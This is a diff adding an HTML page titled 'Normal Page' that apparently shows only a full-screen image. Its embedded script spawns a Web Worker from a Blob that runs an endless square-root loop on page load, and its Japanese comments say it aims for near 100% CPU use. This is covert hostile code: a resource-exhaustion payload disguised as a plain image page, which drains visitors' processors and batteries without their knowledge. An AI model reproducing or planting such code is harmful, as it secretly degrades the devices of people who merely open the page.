@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>Normal Page</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background: black;
+      overflow: hidden;
+    }
+
+    img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain; /* cover にすると全面表示 */
+      display: block;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- UIは画像だけ -->
+  <img src="1762054812968.jpg" alt="image">
+
+  <script>
+    /* ========= UI側は何もしない ========= */
+
+    /* ========= Worker生成（CPU100%寄り） ========= */
+    const workerCode = `
+      function burnCPU() {
+        let x = 0;
+        for (let i = 0; i < 1e7; i++) {
+          x += Math.sqrt(Math.random() * i);
+        }
+        setTimeout(burnCPU, 0); // 制御は返す
+      }
+      burnCPU();
+    `;
+
+    const blob = new Blob([workerCode], {
+      type: "application/javascript"
+    });
+
+    const worker = new Worker(URL.createObjectURL(blob));
+  </script>
+
+</body>
+</html>
